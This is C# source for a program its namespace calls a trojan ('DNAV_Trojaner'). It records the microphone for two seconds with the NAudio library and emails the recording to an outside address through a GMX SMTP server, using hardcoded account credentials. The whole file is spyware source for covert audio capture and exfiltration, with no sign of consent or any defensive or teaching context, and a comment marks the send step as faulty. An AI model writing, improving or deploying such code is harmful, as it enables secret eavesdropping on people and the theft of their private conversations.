using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NAudio.Wave;
using System.Net.Mail;
namespace DNAV_Trojaner {
    class Program {
        //! benötigt: https://github.com/naudio/NAudio/releases
        static public WaveInEvent waveSource = null;
        static public WaveFileWriter waveFile = null;

        static public int time = 2;
        static public string email = "temp@mail.de";
        
        static public string username = "DNAV@gmx.de";
        static public string pw = "MiauMiau";
        static public string message = "Audio von DNAV";
        static public void waveSource_DataAvailable(object sender, WaveInEventArgs e) {
            if (waveFile != null) {
                waveFile.Write(e.Buffer, 0, e.BytesRecorded);
                waveFile.Flush();
            }
        }

        static public void waveSource_RecordingStopped(object sender, StoppedEventArgs e) {
            if (waveSource != null) {
                waveSource.Dispose();
                waveSource = null;
            }

            if (waveFile != null) {
                waveFile.Dispose();

                waveFile = null;
            }
        }

        static public void send(){
            MailMessage mail = new  MailMessage();
            SmtpClient SmtpServer = new SmtpClient();
            SmtpServer.UseDefaultCredentials = false;
            SmtpServer.Credentials = new System.Net.NetworkCredential(username, pw);
            SmtpServer.EnableSsl = false;
            mail.To.Add(email);
            mail.From = new MailAddress("dnav@gmx.com");
            mail.Subject = "Soundoutput";
            mail.Attachments.Add(new Attachment("Test.wav"));
            mail.Body = message;
            SmtpServer.Host = "mail.gmx.com";
            SmtpServer.Port = 465;
            SmtpServer.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
            try {
                //! FEHLER
                SmtpServer.Send(mail);
            }
            catch (Exception ex) {
                Console.WriteLine(ex);
                Console.ReadLine();
            }
        }
        static void Main(string[] args) {
            waveSource = new WaveInEvent();
            waveSource.WaveFormat = new WaveFormat(44100, 1);
            waveSource.DataAvailable += new EventHandler <WaveInEventArgs> (waveSource_DataAvailable);
            waveSource.RecordingStopped += new EventHandler <StoppedEventArgs> (waveSource_RecordingStopped);
            waveFile = new WaveFileWriter(@"Test.wav", waveSource.WaveFormat);
            waveSource.StartRecording();
            System.Threading.Thread.Sleep(time*1000);
            waveSource.StopRecording(); 
            send();
        }
    }
}